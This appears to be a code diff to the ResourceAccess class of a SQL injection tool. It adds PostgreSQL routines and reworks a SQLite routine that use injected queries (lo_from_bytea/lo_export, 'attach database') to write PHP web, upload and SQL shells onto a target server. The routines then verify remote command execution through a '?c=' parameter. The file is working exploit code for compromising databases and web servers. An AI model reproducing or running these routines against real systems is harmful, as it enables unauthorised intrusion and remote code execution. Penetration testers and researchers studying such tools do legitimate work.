@@ -201,7 +201,7 @@ public class ResourceAccess {
             "create table ", nameDbRandom, ".", nameTableRandom, " (c text);",
             "insert into ", nameDbRandom, ".", nameTableRandom, " (c) values (\"", bodyExploit, "\");"
         );
-        this.injectionModel.injectWithoutIndex(String.format(query), "sqlt#add-shll");
+        this.injectionModel.injectWithoutIndex(String.format(query), "sqlt#add-upl");
 
         BinaryOperator<String> biFuncGetRequest = (String pathExploitFixed, String urlSuccess) -> {
             try (InputStream streamToUpload = new FileInputStream(fileToUpload)) {
@@ -223,23 +223,85 @@ public class ResourceAccess {
         this.checkUrls(urlExploit, nameExploit, biFuncGetRequest);
     }
 
-    public String createExploitWebSqlite(String remotePathFolder, String urlShell) {
+    public void createExploitUploadPostgres(String pathExploit, String urlExploit, File fileToUpload) {
+        String bodyExploit = StringUtil.base64Decode(
+                this.injectionModel.getMediatorUtils().getPropertiesUtil().getProperties().getProperty("exploit.upl")
+            )
+            .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD)
+            .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);
+
+        var loid = this.getResult("SELECT lo_from_bytea(0, '"+ bodyExploit.replace("'", "\"") +"')::text", "pg#add-loid");
+        if (StringUtils.isEmpty(loid)) {
+            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Exploit loid not found");
+            return;
+        }
+        var nameExploit = RandomStringUtils.secure().nextAlphabetic(8) +".php";
+        this.getResult("SELECT lo_export("+ loid +", '"+ pathExploit + nameExploit +"')::text", "sqlt#write-loid");
+
+        BinaryOperator<String> biFuncGetRequest = (String pathExploitFixed, String urlSuccess) -> {
+            try (InputStream streamToUpload = new FileInputStream(fileToUpload)) {
+                HttpResponse<String> result = this.upload(fileToUpload, urlSuccess, streamToUpload);
+                if (result.body().contains(DataAccess.LEAD +"y")) {
+                    LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Upload successful: ack received for {}{}", pathExploit, fileToUpload.getName());
+                } else {
+                    LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Upload failure: missing ack for {}{}", pathExploit, fileToUpload.getName());
+                }
+            } catch (InterruptedException e) {
+                LOGGER.log(LogLevelUtil.IGNORE, e, e);
+                Thread.currentThread().interrupt();
+            } catch (IOException | JSqlException e) {
+                throw new JSqlRuntimeException(e);
+            }
+            return urlSuccess;
+        };
+
+        this.checkUrls(urlExploit, nameExploit, biFuncGetRequest);
+    }
+
+    public String createExploitSqlPostgres(String pathExploit, String urlExploit, String username, String password) {
+        BinaryOperator<String> biFuncGetRequest = (String pathExploitFixed, String urlSuccess) -> {
+            var resultQuery = this.runSqlShell("select 1337", null, urlSuccess, username, password, false);
+            if (resultQuery != null && resultQuery.contains("| 1337 |")) {
+                var request = new Request();
+                request.setMessage(Interaction.ADD_TAB_EXPLOIT_SQL);
+                request.setParameters(urlSuccess, username, password);
+                this.injectionModel.sendToViews(request);
+                return urlSuccess;
+            }
+            return StringUtils.EMPTY;
+        };
+
+        String bodyExploit = StringUtil.base64Decode(
+                this.injectionModel.getMediatorUtils().getPropertiesUtil().getProperties().getProperty("exploit.sql.pdo.pgsql")
+            )
+            .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD)
+            .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);
+
+        var loid = this.getResult("SELECT lo_from_bytea(0, '"+ bodyExploit.replace("'", "\"") +"')::text", "pg#add-loid");
+        if (StringUtils.isEmpty(loid)) {
+            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Exploit loid not found");
+            return bodyExploit;
+        }
+        var nameExploit = RandomStringUtils.secure().nextAlphabetic(8) +".php";
+        this.getResult("SELECT lo_export("+ loid +", '"+ pathExploit + nameExploit +"')::text", "sqlt#write-loid");
+
+        return this.checkUrls(urlExploit, nameExploit, biFuncGetRequest);
+    }
+
+    public void createExploitWebPostgres(String remotePathFolder, String urlExploit) {
         String bodyExploit = StringUtil.base64Decode(
                 this.injectionModel.getMediatorUtils().getPropertiesUtil().getProperties().getProperty("exploit.web")
             )
             .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD)
             .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);
-        var nameDbRandom = RandomStringUtils.secure().nextAlphabetic(8);
-        var nameTableRandom = RandomStringUtils.secure().nextAlphabetic(8);
-        var nameExploit = nameDbRandom + nameTableRandom +".php";
-        var query = String.join(
-            StringUtils.EMPTY,
-            " ; ",
-            "attach database '", remotePathFolder, nameExploit, "' as ", nameDbRandom, ";",
-            "create table ", nameDbRandom, ".", nameTableRandom, " (c text);",
-            "insert into ", nameDbRandom, ".", nameTableRandom, " (c) values (\"", bodyExploit, "\");"
-        );
-        this.injectionModel.injectWithoutIndex(String.format(query), "sqlt#add-shll");
+
+        var loid = this.getResult("SELECT lo_from_bytea(0, '"+ bodyExploit.replace("'", "\"") +"')::text", "pg#add-loid");
+        if (StringUtils.isEmpty(loid)) {
+            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Exploit loid not found");
+            return;
+        }
+        var nameExploit = RandomStringUtils.secure().nextAlphabetic(8) +".php";
+        this.getResult("SELECT lo_export("+ loid +", '"+ remotePathFolder + nameExploit +"')::text", "sqlt#write-loid");
 
         BinaryOperator<String> biFuncGetRequest = (String pathExploitFixed, String urlSuccess) -> {
             String result = this.runCommandShell(
@@ -257,7 +319,60 @@ public class ResourceAccess {
             return urlSuccess;
         };
 
-        return this.checkUrls(urlShell, nameExploit, biFuncGetRequest);
+        this.checkUrls(urlExploit, nameExploit, biFuncGetRequest);
+    }
+
+    public String getResult(String query, String metadata) {
+        var sourcePage = new String[]{ StringUtils.EMPTY };
+        try {
+            return new SuspendableGetRows(this.injectionModel).run(
+                query,
+                sourcePage,
+                false,
+                0,
+                MockElement.MOCK,
+                metadata
+            );
+        } catch (JSqlException ignored) {
+            return StringUtils.EMPTY;
+        }
+    }
+
+    public String createExploitWebSqlite(String remotePathFolder, String urlExploit) {
+        String bodyExploit = StringUtil.base64Decode(
+                this.injectionModel.getMediatorUtils().getPropertiesUtil().getProperties().getProperty("exploit.web")
+            )
+            .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD)
+            .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);
+        var nameDbRandom = RandomStringUtils.secure().nextAlphabetic(8);
+        var nameTableRandom = RandomStringUtils.secure().nextAlphabetic(8);
+        var nameExploit = nameDbRandom + nameTableRandom +".php";
+        var query = String.join(
+            StringUtils.EMPTY,
+            " ; ",
+            "attach database '", remotePathFolder, nameExploit, "' as ", nameDbRandom, ";",
+            "create table ", nameDbRandom, ".", nameTableRandom, " (c text);",
+            "insert into ", nameDbRandom, ".", nameTableRandom, " (c) values (\"", bodyExploit, "\");"
+        );
+        this.injectionModel.injectWithoutIndex(query, "sqlt#add-web");
+
+        BinaryOperator<String> biFuncGetRequest = (String pathExploitFixed, String urlSuccess) -> {
+            String result = this.runCommandShell(
+                urlSuccess +"?c="+ URLEncoder.encode("echo \"iamin$((133707330+1))\"", StandardCharsets.ISO_8859_1)
+            );
+            if (!result.contains("iamin133707331")) {
+                LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Exploit body not found");
+                return StringUtils.EMPTY;
+            }
+
+            var request = new Request();
+            request.setMessage(Interaction.ADD_TAB_EXPLOIT_WEB);
+            request.setParameters(urlSuccess);
+            this.injectionModel.sendToViews(request);
+            return urlSuccess;
+        };
+
+        return this.checkUrls(urlExploit, nameExploit, biFuncGetRequest);
     }
 
     public String createExploitWebMysql(String pathExploit, String urlExploit, String pathNetshare, ExploitMode exploitMode) throws JSqlException {
@@ -306,7 +421,7 @@ public class ResourceAccess {
         var urlSuccess = this.createExploit(pathExploit, urlExploit, "exploit.sql.mysqli", ResourceAccess.SQL_DOT_PHP, biFuncGetRequest, pathNetshare, exploitMode);
         if (StringUtils.isEmpty(urlSuccess)) {
             LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Failure with mysqli_query(), trying with pdo()...");
-            urlSuccess = this.createExploit(pathExploit, urlExploit, "exploit.sql.pdo", ResourceAccess.SQL_DOT_PHP, biFuncGetRequest, pathNetshare, exploitMode);
+            urlSuccess = this.createExploit(pathExploit, urlExploit, "exploit.sql.pdo.mysql", ResourceAccess.SQL_DOT_PHP, biFuncGetRequest, pathNetshare, exploitMode);
         }
         if (StringUtils.isEmpty(urlSuccess)) {
             LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Failure with pdo(), trying with mysql_query()...");
